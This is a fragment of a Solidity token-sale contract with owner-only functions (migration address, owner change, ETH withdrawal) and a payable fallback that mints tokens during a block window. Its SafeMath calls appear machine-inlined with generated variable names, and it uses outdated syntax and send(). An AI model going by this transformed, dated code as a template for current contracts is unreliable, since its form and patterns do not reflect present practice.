    function setMigrateContract(address _newContractAddr) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(_newContractAddr != newContractAddr)) {
            revert();
        }
        newContractAddr = _newContractAddr;
    }

    function changeOwner(address _newFundDeposit) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(_newFundDeposit != address(0x0))) {
            revert();
        }
        ethFundDeposit = _newFundDeposit;
    }

    function transferETH() external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!(address(this).balance != 0)) {
            revert();
        }
        if (!(ethFundDeposit.send(address(this).balance))) {
            revert();
        }
    }

    function() public payable {
        if (!(msg.value != 0)) {
            revert();
        }
        if (!(block.number >= fundingStartBlock)) {
            revert();
        }
        if (!(block.number <= fundingStopBlock)) {
            revert();
        }
        uint256 AGGToken_safeMult_TMP_152_0_0;
        {
            {
                uint256 AGGToken_safeMult_2_z_0_0 = msg.value * tokenExchangeRate;
                if (!((msg.value == 0) || (AGGToken_safeMult_2_z_0_0 / msg.value == tokenExchangeRate))) {
                    revert();
                }
                AGGToken_safeMult_TMP_152_0_0 = AGGToken_safeMult_2_z_0_0;
            }
        }
        uint256 tokens = AGGToken_safeMult_TMP_152_0_0;
        if (!(tokens + tokenRaised <= currentSupply)) {
            revert();
        }
        uint256 AGGToken_safeAdd_TMP_157_0_0;
        {
            {
                uint256 AGGToken_safeAdd_2_z_0_0 = tokenRaised + tokens;
                if (!((AGGToken_safeAdd_2_z_0_0 >= tokenRaised) && (AGGToken_safeAdd_2_z_0_0 >= tokens))) {
                    revert();
                }
                AGGToken_safeAdd_TMP_157_0_0 = AGGToken_safeAdd_2_z_0_0;
            }
        }
        tokenRaised = AGGToken_safeAdd_TMP_157_0_0;
        balances[msg.sender] += tokens;
        emit IssueToken(msg.sender, tokens);
    }
}

```
